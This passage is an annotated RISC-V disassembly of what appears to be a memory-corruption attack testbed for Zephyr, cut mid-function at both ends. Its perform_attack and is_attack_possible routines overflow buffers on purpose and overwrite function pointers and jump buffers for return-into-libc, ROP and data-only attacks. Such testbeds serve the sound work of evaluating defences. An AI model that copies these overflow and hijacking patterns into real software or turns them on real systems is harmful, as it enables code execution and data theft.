            fprintf(stderr, "Error: Could not build payload\n");
80001b52:	80007537          	lui	a0,0x80007
80001b56:	5ac50513          	addi	a0,a0,1452 # 800075ac <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800075ad>
80001b5a:	077000ef          	jal	ra,800023d0 <printk>
        exit(1);
80001b5e:	4505                	li	a0,1
80001b60:	6fc040ef          	jal	ra,8000625c <exit>
80001b64:	95042603          	lw	a2,-1712(s0)
80001b68:	167d                	addi	a2,a2,-1
80001b6a:	95842583          	lw	a1,-1704(s0)
80001b6e:	94842503          	lw	a0,-1720(s0)
80001b72:	c7dfe0ef          	jal	ra,800007ee <memcpy>
    switch (attack.technique) {
80001b76:	800097b7          	lui	a5,0x80009
80001b7a:	4dc7a783          	lw	a5,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001b7e:	06400713          	li	a4,100
80001b82:	02e78c63          	beq	a5,a4,80001bba <perform_attack+0x8c6>
80001b86:	06500713          	li	a4,101
80001b8a:	1ee79763          	bne	a5,a4,80001d78 <perform_attack+0xa84>
            if (attack.function == SSCANF) {
80001b8e:	800097b7          	lui	a5,0x80009
80001b92:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001b96:	4b98                	lw	a4,16(a5)
80001b98:	1fb00793          	li	a5,507
80001b9c:	10f70063          	beq	a4,a5,80001c9c <perform_attack+0x9a8>
            if (attack.inject_param == RETURN_INTO_LIBC) {
80001ba0:	800097b7          	lui	a5,0x80009
80001ba4:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001ba8:	43dc                	lw	a5,4(a5)
80001baa:	0c900713          	li	a4,201
80001bae:	10e78363          	beq	a5,a4,80001cb4 <perform_attack+0x9c0>
            } else if (attack.inject_param == INJECTED_CODE_NO_NOP) {
80001bb2:	0c800713          	li	a4,200
80001bb6:	1ae78a63          	beq	a5,a4,80001d6a <perform_attack+0xa76>
    printf("");
80001bba:	80007537          	lui	a0,0x80007
80001bbe:	48050513          	addi	a0,a0,1152 # 80007480 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007481>
80001bc2:	00f000ef          	jal	ra,800023d0 <printk>
    printf("\nExecuting attack... ");
80001bc6:	80007537          	lui	a0,0x80007
80001bca:	64050513          	addi	a0,a0,1600 # 80007640 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007641>
80001bce:	003000ef          	jal	ra,800023d0 <printk>
    switch (attack.code_ptr) {
80001bd2:	800097b7          	lui	a5,0x80009
80001bd6:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001bda:	479c                	lw	a5,8(a5)
80001bdc:	ed378793          	addi	a5,a5,-301
80001be0:	4741                	li	a4,16
80001be2:	1af76763          	bltu	a4,a5,80001d90 <perform_attack+0xa9c>
80001be6:	078a                	slli	a5,a5,0x2
80001be8:	80007737          	lui	a4,0x80007
80001bec:	72070713          	addi	a4,a4,1824 # 80007720 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007721>
80001bf0:	97ba                	add	a5,a5,a4
80001bf2:	439c                	lw	a5,0(a5)
80001bf4:	8782                	jr	a5
__ssp_bos_icheck2_restrict(stpcpy, char *, const char *)
#if __GNUC_PREREQ__(4,8) || defined(__clang__)
__ssp_bos_icheck3_restrict(stpncpy, char *, const char *)
#endif
__ssp_bos_icheck2_restrict(strcpy, char *, const char *)
80001bf6:	95842583          	lw	a1,-1704(s0)
80001bfa:	94842503          	lw	a0,-1720(s0)
80001bfe:	105040ef          	jal	ra,80006502 <strcpy>
80001c02:	bf95                	j	80001b76 <perform_attack+0x882>
__ssp_bos_icheck2_restrict(strcat, char *, const char *)
__ssp_bos_icheck3_restrict(strncpy, char *, const char *)
80001c04:	95042603          	lw	a2,-1712(s0)
80001c08:	95842583          	lw	a1,-1704(s0)
80001c0c:	94842503          	lw	a0,-1720(s0)
80001c10:	1d1040ef          	jal	ra,800065e0 <strncpy>
80001c14:	b78d                	j	80001b76 <perform_attack+0x882>
            sprintf(buffer, "%s", payload.buffer);
80001c16:	95842583          	lw	a1,-1704(s0)
80001c1a:	94842503          	lw	a0,-1720(s0)
80001c1e:	0e5040ef          	jal	ra,80006502 <strcpy>
80001c22:	bf91                	j	80001b76 <perform_attack+0x882>
            snprintf(buffer, payload.size, "%s", payload.buffer);
80001c24:	95842683          	lw	a3,-1704(s0)
80001c28:	80007637          	lui	a2,0x80007
80001c2c:	5cc60613          	addi	a2,a2,1484 # 800075cc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800075cd>
80001c30:	95042583          	lw	a1,-1712(s0)
80001c34:	94842503          	lw	a0,-1720(s0)
80001c38:	003040ef          	jal	ra,8000643a <sniprintf>
80001c3c:	bf2d                	j	80001b76 <perform_attack+0x882>
__ssp_bos_icheck2_restrict(strcat, char *, const char *)
80001c3e:	95842583          	lw	a1,-1704(s0)
80001c42:	94842503          	lw	a0,-1720(s0)
80001c46:	063040ef          	jal	ra,800064a8 <strcat>
80001c4a:	b735                	j	80001b76 <perform_attack+0x882>
__ssp_bos_icheck3_restrict(strncat, char *, const char *)
80001c4c:	95042603          	lw	a2,-1712(s0)
80001c50:	95842583          	lw	a1,-1704(s0)
80001c54:	94842503          	lw	a0,-1720(s0)
80001c58:	115040ef          	jal	ra,8000656c <strncat>
80001c5c:	bf29                	j	80001b76 <perform_attack+0x882>
            snprintf(format_string_buf, 15, "%%%ic", payload.size);
80001c5e:	95042683          	lw	a3,-1712(s0)
80001c62:	80007637          	lui	a2,0x80007
80001c66:	5d060613          	addi	a2,a2,1488 # 800075d0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800075d1>
80001c6a:	45bd                	li	a1,15
80001c6c:	bac40513          	addi	a0,s0,-1108
80001c70:	7ca040ef          	jal	ra,8000643a <sniprintf>
80001c74:	b709                	j	80001b76 <perform_attack+0x882>
            homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
80001c76:	95042603          	lw	a2,-1712(s0)
80001c7a:	167d                	addi	a2,a2,-1
80001c7c:	95842583          	lw	a1,-1704(s0)
80001c80:	94842503          	lw	a0,-1720(s0)
80001c84:	9ecff0ef          	jal	ra,80000e70 <homebrew_memcpy>
80001c88:	b5fd                	j	80001b76 <perform_attack+0x882>
                fprintf(stderr, "Error: Unknown choice of function\n");
80001c8a:	80007537          	lui	a0,0x80007
80001c8e:	5d850513          	addi	a0,a0,1496 # 800075d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800075d9>
80001c92:	73e000ef          	jal	ra,800023d0 <printk>
            exit(1);
80001c96:	4505                	li	a0,1
80001c98:	5c4040ef          	jal	ra,8000625c <exit>
                *(uint32_t *) target_addr <<= 8;
80001c9c:	92042683          	lw	a3,-1760(s0)
80001ca0:	429c                	lw	a5,0(a3)
80001ca2:	00879713          	slli	a4,a5,0x8
80001ca6:	c298                	sw	a4,0(a3)
                *(uint32_t *) target_addr >>= 8;
80001ca8:	01000737          	lui	a4,0x1000
80001cac:	177d                	addi	a4,a4,-1 # ffffff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x67697f>
80001cae:	8ff9                	and	a5,a5,a4
80001cb0:	c29c                	sw	a5,0(a3)
80001cb2:	b5fd                	j	80001ba0 <perform_attack+0x8ac>
                payload.overflow_ptr = &ret2libc_target;
80001cb4:	800017b7          	lui	a5,0x80001
80001cb8:	b7878793          	addi	a5,a5,-1160 # 80000b78 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b79>
80001cbc:	94f42a23          	sw	a5,-1708(s0)
                  - (uintptr_t) buffer + sizeof(long) + 1;
80001cc0:	94842783          	lw	a5,-1720(s0)
80001cc4:	91442483          	lw	s1,-1772(s0)
80001cc8:	40f487b3          	sub	a5,s1,a5
80001ccc:	0795                	addi	a5,a5,5
                payload.size         = (uintptr_t) target_addr_aux
80001cce:	94f42823          	sw	a5,-1712(s0)
                build_payload(&payload);
80001cd2:	94c40513          	addi	a0,s0,-1716
80001cd6:	800ff0ef          	jal	ra,80000cd6 <build_payload>
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
80001cda:	95042603          	lw	a2,-1712(s0)
80001cde:	167d                	addi	a2,a2,-1
80001ce0:	95842583          	lw	a1,-1704(s0)
80001ce4:	94842503          	lw	a0,-1720(s0)
80001ce8:	b07fe0ef          	jal	ra,800007ee <memcpy>
                printf("target_addr_aux: %p\n", target_addr_aux);
80001cec:	85a6                	mv	a1,s1
80001cee:	80007537          	lui	a0,0x80007
80001cf2:	5fc50513          	addi	a0,a0,1532 # 800075fc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800075fd>
80001cf6:	6da000ef          	jal	ra,800023d0 <printk>
                switch (attack.location) {
80001cfa:	800097b7          	lui	a5,0x80009
80001cfe:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001d02:	47dc                	lw	a5,12(a5)
80001d04:	19200713          	li	a4,402
80001d08:	04e78863          	beq	a5,a4,80001d58 <perform_attack+0xa64>
80001d0c:	02f76263          	bltu	a4,a5,80001d30 <perform_attack+0xa3c>
80001d10:	19000713          	li	a4,400
80001d14:	02e78b63          	beq	a5,a4,80001d4a <perform_attack+0xa56>
80001d18:	19100713          	li	a4,401
80001d1c:	e8e79fe3          	bne	a5,a4,80001bba <perform_attack+0x8c6>
                          (uintptr_t) *heap_mem_ptr_aux;
80001d20:	91042783          	lw	a5,-1776(s0)
80001d24:	4398                	lw	a4,0(a5)
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d26:	92042783          	lw	a5,-1760(s0)
80001d2a:	439c                	lw	a5,0(a5)
80001d2c:	c398                	sw	a4,0(a5)
                        break;
80001d2e:	b571                	j	80001bba <perform_attack+0x8c6>
80001d30:	19300713          	li	a4,403
80001d34:	e8e793e3          	bne	a5,a4,80001bba <perform_attack+0x8c6>
                          (uintptr_t) *data_mem_ptr_aux;
80001d38:	8000c7b7          	lui	a5,0x8000c
80001d3c:	b887a703          	lw	a4,-1144(a5) # 8000bb88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bb89>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d40:	92042783          	lw	a5,-1760(s0)
80001d44:	439c                	lw	a5,0(a5)
80001d46:	c398                	sw	a4,0(a5)
                        break;
80001d48:	bd8d                	j	80001bba <perform_attack+0x8c6>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d4a:	92042783          	lw	a5,-1760(s0)
80001d4e:	439c                	lw	a5,0(a5)
                          (uintptr_t) stack_mem_ptr_aux;
80001d50:	94042703          	lw	a4,-1728(s0)
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d54:	c398                	sw	a4,0(a5)
                        break;
80001d56:	b595                	j	80001bba <perform_attack+0x8c6>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d58:	92042783          	lw	a5,-1760(s0)
80001d5c:	439c                	lw	a5,0(a5)
                          (uintptr_t) bss_mem_ptr_aux;
80001d5e:	80009737          	lui	a4,0x80009
80001d62:	01872703          	lw	a4,24(a4) # 80009018 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009019>
                        *(uint32_t *) (*(uint32_t *) target_addr) =
80001d66:	c398                	sw	a4,0(a5)
                        break;
80001d68:	bd89                	j	80001bba <perform_attack+0x8c6>
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
80001d6a:	92042783          	lw	a5,-1760(s0)
80001d6e:	439c                	lw	a5,0(a5)
                  (uintptr_t) buffer;
80001d70:	94842703          	lw	a4,-1720(s0)
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
80001d74:	c398                	sw	a4,0(a5)
80001d76:	b591                	j	80001bba <perform_attack+0x8c6>
                fprintf(stderr, "Error: Unknown choice of attack parameterB\n");
80001d78:	80007537          	lui	a0,0x80007
80001d7c:	61450513          	addi	a0,a0,1556 # 80007614 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007615>
80001d80:	2d81                	jal	800023d0 <printk>
            exit(1);
80001d82:	4505                	li	a0,1
80001d84:	4d8040ef          	jal	ra,8000625c <exit>
            stack_func_ptr(NULL);
80001d88:	4501                	li	a0,0
80001d8a:	93842783          	lw	a5,-1736(s0)
80001d8e:	9782                	jalr	a5
} /* perform_attack */
80001d90:	8000c7b7          	lui	a5,0x8000c
80001d94:	fdc42703          	lw	a4,-36(s0)
80001d98:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80001d9c:	8fb9                	xor	a5,a5,a4
80001d9e:	4701                	li	a4,0
80001da0:	14079863          	bnez	a5,80001ef0 <perform_attack+0xbfc>
80001da4:	6fc12083          	lw	ra,1788(sp)
80001da8:	6f812403          	lw	s0,1784(sp)
80001dac:	6f412483          	lw	s1,1780(sp)
80001db0:	6f012903          	lw	s2,1776(sp)
80001db4:	6ec12983          	lw	s3,1772(sp)
80001db8:	6e812a03          	lw	s4,1768(sp)
80001dbc:	70010113          	addi	sp,sp,1792
80001dc0:	8082                	ret
            ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
80001dc2:	4581                	li	a1,0
80001dc4:	4501                	li	a0,0
80001dc6:	92c42783          	lw	a5,-1748(s0)
80001dca:	9782                	jalr	a5
80001dcc:	b7d1                	j	80001d90 <perform_attack+0xa9c>
            ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
80001dce:	92442783          	lw	a5,-1756(s0)
80001dd2:	439c                	lw	a5,0(a5)
80001dd4:	4581                	li	a1,0
80001dd6:	4501                	li	a0,0
80001dd8:	9782                	jalr	a5
80001dda:	bf5d                	j	80001d90 <perform_attack+0xa9c>
            ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
80001ddc:	800097b7          	lui	a5,0x80009
80001de0:	0107a783          	lw	a5,16(a5) # 80009010 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009011>
80001de4:	4581                	li	a1,0
80001de6:	4501                	li	a0,0
80001de8:	9782                	jalr	a5
80001dea:	b75d                	j	80001d90 <perform_attack+0xa9c>
            ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
80001dec:	8000c7b7          	lui	a5,0x8000c
80001df0:	fe87a783          	lw	a5,-24(a5) # 8000bfe8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bfe9>
80001df4:	4581                	li	a1,0
80001df6:	4501                	li	a0,0
80001df8:	9782                	jalr	a5
80001dfa:	bf59                	j	80001d90 <perform_attack+0xa9c>
            lj_func(stack_jmp_buffer);
80001dfc:	a7840513          	addi	a0,s0,-1416
80001e00:	85aff0ef          	jal	ra,80000e5a <lj_func>
            lj_func(stack_jmp_buffer_param);
80001e04:	92842503          	lw	a0,-1752(s0)
80001e08:	852ff0ef          	jal	ra,80000e5a <lj_func>
            lj_func(*heap_jmp_buffer);
80001e0c:	91842503          	lw	a0,-1768(s0)
80001e10:	84aff0ef          	jal	ra,80000e5a <lj_func>
            lj_func(data_jmp_buffer);
80001e14:	8000c537          	lui	a0,0x8000c
80001e18:	95850513          	addi	a0,a0,-1704 # 8000b958 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b959>
80001e1c:	83eff0ef          	jal	ra,80000e5a <lj_func>
            lj_func(bss_jmp_buffer);
80001e20:	80009537          	lui	a0,0x80009
80001e24:	06850513          	addi	a0,a0,104 # 80009068 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009069>
80001e28:	832ff0ef          	jal	ra,80000e5a <lj_func>
            ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
80001e2c:	4581                	li	a1,0
80001e2e:	4501                	li	a0,0
80001e30:	a7442783          	lw	a5,-1420(s0)
80001e34:	9782                	jalr	a5
80001e36:	bfa9                	j	80001d90 <perform_attack+0xa9c>
            (*heap_struct->func_ptr)(NULL, 0);
80001e38:	91c42783          	lw	a5,-1764(s0)
80001e3c:	1007a783          	lw	a5,256(a5)
80001e40:	4581                	li	a1,0
80001e42:	4501                	li	a0,0
80001e44:	9782                	jalr	a5
80001e46:	b7a9                	j	80001d90 <perform_attack+0xa9c>
            (*data_struct.func_ptr)(NULL, 0);
80001e48:	8000c7b7          	lui	a5,0x8000c
80001e4c:	da878793          	addi	a5,a5,-600 # 8000bda8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bda9>
80001e50:	1007a783          	lw	a5,256(a5)
80001e54:	4581                	li	a1,0
80001e56:	4501                	li	a0,0
80001e58:	9782                	jalr	a5
80001e5a:	bf1d                	j	80001d90 <perform_attack+0xa9c>
            (*bss_struct.func_ptr)(NULL, 0);
80001e5c:	800097b7          	lui	a5,0x80009
80001e60:	2b878793          	addi	a5,a5,696 # 800092b8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800092b9>
80001e64:	1007a783          	lw	a5,256(a5)
80001e68:	4581                	li	a1,0
80001e6a:	4501                	li	a0,0
80001e6c:	9782                	jalr	a5
80001e6e:	b70d                	j	80001d90 <perform_attack+0xa9c>
            switch (attack.location) {
80001e70:	800097b7          	lui	a5,0x80009
80001e74:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001e78:	47dc                	lw	a5,12(a5)
80001e7a:	19200713          	li	a4,402
80001e7e:	04e78a63          	beq	a5,a4,80001ed2 <perform_attack+0xbde>
80001e82:	02f76263          	bltu	a4,a5,80001ea6 <perform_attack+0xbb2>
80001e86:	19000713          	li	a4,400
80001e8a:	02e78c63          	beq	a5,a4,80001ec2 <perform_attack+0xbce>
80001e8e:	19100713          	li	a4,401
80001e92:	eee79fe3          	bne	a5,a4,80001d90 <perform_attack+0xa9c>
                    dop_target(buffer, *heap_mem_ptr);
80001e96:	90c42783          	lw	a5,-1780(s0)
80001e9a:	438c                	lw	a1,0(a5)
80001e9c:	94842503          	lw	a0,-1720(s0)
80001ea0:	8b6ff0ef          	jal	ra,80000f56 <dop_target>
80001ea4:	b5f5                	j	80001d90 <perform_attack+0xa9c>
80001ea6:	19300713          	li	a4,403
80001eaa:	eee793e3          	bne	a5,a4,80001d90 <perform_attack+0xa9c>
                    dop_target(buffer, **data_mem_ptr);
80001eae:	8000c7b7          	lui	a5,0x8000c
80001eb2:	a887a783          	lw	a5,-1400(a5) # 8000ba88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000ba89>
80001eb6:	438c                	lw	a1,0(a5)
80001eb8:	94842503          	lw	a0,-1720(s0)
80001ebc:	89aff0ef          	jal	ra,80000f56 <dop_target>
80001ec0:	bdc1                	j	80001d90 <perform_attack+0xa9c>
                    dop_target(buffer, *stack_mem_ptr);
80001ec2:	93c42783          	lw	a5,-1732(s0)
80001ec6:	438c                	lw	a1,0(a5)
80001ec8:	94842503          	lw	a0,-1720(s0)
80001ecc:	88aff0ef          	jal	ra,80000f56 <dop_target>
80001ed0:	b5c1                	j	80001d90 <perform_attack+0xa9c>
                    dop_target(buffer, *bss_mem_ptr);
80001ed2:	800097b7          	lui	a5,0x80009
80001ed6:	0147a783          	lw	a5,20(a5) # 80009014 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009015>
80001eda:	438c                	lw	a1,0(a5)
80001edc:	94842503          	lw	a0,-1720(s0)
80001ee0:	876ff0ef          	jal	ra,80000f56 <dop_target>
80001ee4:	b575                	j	80001d90 <perform_attack+0xa9c>
			data_leak(buffer);
80001ee6:	94842503          	lw	a0,-1720(s0)
80001eea:	8d2ff0ef          	jal	ra,80000fbc <data_leak>
80001eee:	b54d                	j	80001d90 <perform_attack+0xa9c>
} /* perform_attack */
80001ef0:	603030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80001ef4 <is_attack_possible>:

boolean
is_attack_possible()
{
80001ef4:	1101                	addi	sp,sp,-32
80001ef6:	ce06                	sw	ra,28(sp)
80001ef8:	8000c7b7          	lui	a5,0x8000c
80001efc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80001f00:	c63a                	sw	a4,12(sp)
80001f02:	4701                	li	a4,0
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
80001f04:	800097b7          	lui	a5,0x80009
80001f08:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001f0c:	43dc                	lw	a5,4(a5)
80001f0e:	0c800713          	li	a4,200
80001f12:	06e78163          	beq	a5,a4,80001f74 <is_attack_possible+0x80>
        fprintf(stderr,
          "Error: Impossible to inject shellcode with string functions (for now)\n");
        return FALSE;
    }

    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
80001f16:	0ca00713          	li	a4,202
80001f1a:	08e78163          	beq	a5,a4,80001f9c <is_attack_possible+0xa8>
        fprintf(stderr,
          "Error: Impossible (theoretically) to perform indirect ROP attacks\n");
        return FALSE;
    }

    if (attack.inject_param == DATA_ONLY) {
80001f1e:	0cb00713          	li	a4,203
80001f22:	08e78c63          	beq	a5,a4,80001fba <is_attack_possible+0xc6>
        if (attack.location == HEAP && attack.technique == INDIRECT) {
            fprintf(stderr,
              "Error: Impossible to indirect attack the heap flag.\n");
        	return FALSE;
		}
    } else if (attack.code_ptr == VAR_BOF ||
80001f26:	800097b7          	lui	a5,0x80009
80001f2a:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001f2e:	479c                	lw	a5,8(a5)
			   attack.code_ptr == VAR_IOF ||
80001f30:	ec578793          	addi	a5,a5,-315
    } else if (attack.code_ptr == VAR_BOF ||
80001f34:	4709                	li	a4,2
80001f36:	0ef77f63          	bgeu	a4,a5,80002034 <is_attack_possible+0x140>
          "Error: Must use \"dataonly\" injection parameter for DOP attacks.\n");
    	return FALSE;
	}

    // JM: attacks targeting another memory location must be indirect
    switch (attack.location) {
80001f3a:	800097b7          	lui	a5,0x80009
80001f3e:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001f42:	47dc                	lw	a5,12(a5)
80001f44:	19200713          	li	a4,402
80001f48:	24e78863          	beq	a5,a4,80002198 <is_attack_possible+0x2a4>
80001f4c:	0ef76d63          	bltu	a4,a5,80002046 <is_attack_possible+0x152>
80001f50:	19000713          	li	a4,400
80001f54:	12e78463          	beq	a5,a4,8000207c <is_attack_possible+0x188>
80001f58:	19100713          	li	a4,401
80001f5c:	0ee79363          	bne	a5,a4,80002042 <is_attack_possible+0x14e>
                }
            }
            break;

        case HEAP:
            if ((attack.technique == DIRECT) &&
80001f60:	800097b7          	lui	a5,0x80009
80001f64:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001f68:	06400793          	li	a5,100
80001f6c:	1af70c63          	beq	a4,a5,80002124 <is_attack_possible+0x230>
                return FALSE;
            }
            break;
    }

    return TRUE;
80001f70:	4505                	li	a0,1
80001f72:	a8cd                	j	80002064 <is_attack_possible+0x170>
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
80001f74:	80009737          	lui	a4,0x80009
80001f78:	4dc70713          	addi	a4,a4,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001f7c:	4b18                	lw	a4,16(a4)
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
80001f7e:	1f400693          	li	a3,500
80001f82:	f8d70ae3          	beq	a4,a3,80001f16 <is_attack_possible+0x22>
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
80001f86:	1fc00693          	li	a3,508
80001f8a:	f8d706e3          	beq	a4,a3,80001f16 <is_attack_possible+0x22>
        fprintf(stderr,
80001f8e:	80007537          	lui	a0,0x80007
80001f92:	76450513          	addi	a0,a0,1892 # 80007764 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007765>
80001f96:	292d                	jal	800023d0 <printk>
        return FALSE;
80001f98:	4501                	li	a0,0
80001f9a:	a0e9                	j	80002064 <is_attack_possible+0x170>
      attack.technique != DIRECT)
80001f9c:	80009737          	lui	a4,0x80009
80001fa0:	4dc72683          	lw	a3,1244(a4) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
80001fa4:	06400713          	li	a4,100
80001fa8:	f6e68be3          	beq	a3,a4,80001f1e <is_attack_possible+0x2a>
        fprintf(stderr,
80001fac:	80007537          	lui	a0,0x80007
80001fb0:	7ac50513          	addi	a0,a0,1964 # 800077ac <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800077ad>
80001fb4:	2931                	jal	800023d0 <printk>
        return FALSE;
80001fb6:	4501                	li	a0,0
80001fb8:	a075                	j	80002064 <is_attack_possible+0x170>
        if (attack.code_ptr != VAR_BOF &&
80001fba:	800097b7          	lui	a5,0x80009
80001fbe:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001fc2:	479c                	lw	a5,8(a5)
          	attack.code_ptr != VAR_IOF &&
80001fc4:	ec578693          	addi	a3,a5,-315
        if (attack.code_ptr != VAR_BOF &&
80001fc8:	4709                	li	a4,2
80001fca:	02d76f63          	bltu	a4,a3,80002008 <is_attack_possible+0x114>
        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
80001fce:	ec478793          	addi	a5,a5,-316
80001fd2:	4705                	li	a4,1
80001fd4:	04f77163          	bgeu	a4,a5,80002016 <is_attack_possible+0x122>
        if (attack.location == HEAP && attack.technique == INDIRECT) {
80001fd8:	800097b7          	lui	a5,0x80009
80001fdc:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001fe0:	47d8                	lw	a4,12(a5)
80001fe2:	19100793          	li	a5,401
80001fe6:	f4f71ae3          	bne	a4,a5,80001f3a <is_attack_possible+0x46>
80001fea:	800097b7          	lui	a5,0x80009
80001fee:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001ff2:	06500793          	li	a5,101
80001ff6:	f4f712e3          	bne	a4,a5,80001f3a <is_attack_possible+0x46>
            fprintf(stderr,
80001ffa:	80008537          	lui	a0,0x80008
80001ffe:	85c50513          	addi	a0,a0,-1956 # 8000785c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000785d>
80002002:	26f9                	jal	800023d0 <printk>
        	return FALSE;
80002004:	4501                	li	a0,0
80002006:	a8b9                	j	80002064 <is_attack_possible+0x170>
            fprintf(stderr, "Error: Misused DOP code pointer parameters.\n");
80002008:	80007537          	lui	a0,0x80007
8000200c:	7f050513          	addi	a0,a0,2032 # 800077f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800077f1>
80002010:	26c1                	jal	800023d0 <printk>
			return FALSE;
80002012:	4501                	li	a0,0
80002014:	a881                	j	80002064 <is_attack_possible+0x170>
        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
80002016:	800097b7          	lui	a5,0x80009
8000201a:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
8000201e:	06500793          	li	a5,101
80002022:	faf71be3          	bne	a4,a5,80001fd8 <is_attack_possible+0xe4>
            fprintf(stderr,
80002026:	80008537          	lui	a0,0x80008
8000202a:	82050513          	addi	a0,a0,-2016 # 80007820 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007821>
8000202e:	264d                	jal	800023d0 <printk>
			return FALSE;
80002030:	4501                	li	a0,0
80002032:	a80d                	j	80002064 <is_attack_possible+0x170>
        fprintf(stderr,
80002034:	80008537          	lui	a0,0x80008
80002038:	89450513          	addi	a0,a0,-1900 # 80007894 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007895>
8000203c:	2e51                	jal	800023d0 <printk>
    	return FALSE;
8000203e:	4501                	li	a0,0
80002040:	a015                	j	80002064 <is_attack_possible+0x170>
    switch (attack.location) {
80002042:	4505                	li	a0,1
80002044:	a005                	j	80002064 <is_attack_possible+0x170>
80002046:	19300713          	li	a4,403
8000204a:	00e79c63          	bne	a5,a4,80002062 <is_attack_possible+0x16e>
            if ((attack.technique == DIRECT) &&
8000204e:	800097b7          	lui	a5,0x80009
80002052:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80002056:	06400793          	li	a5,100
8000205a:	10f70263          	beq	a4,a5,8000215e <is_attack_possible+0x26a>
    return TRUE;
8000205e:	4505                	li	a0,1
80002060:	a011                	j	80002064 <is_attack_possible+0x170>
    switch (attack.location) {
80002062:	4505                	li	a0,1
} /* is_attack_possible */
80002064:	8000c7b7          	lui	a5,0x8000c
80002068:	4732                	lw	a4,12(sp)
8000206a:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000206e:	8fb9                	xor	a5,a5,a4
80002070:	4701                	li	a4,0
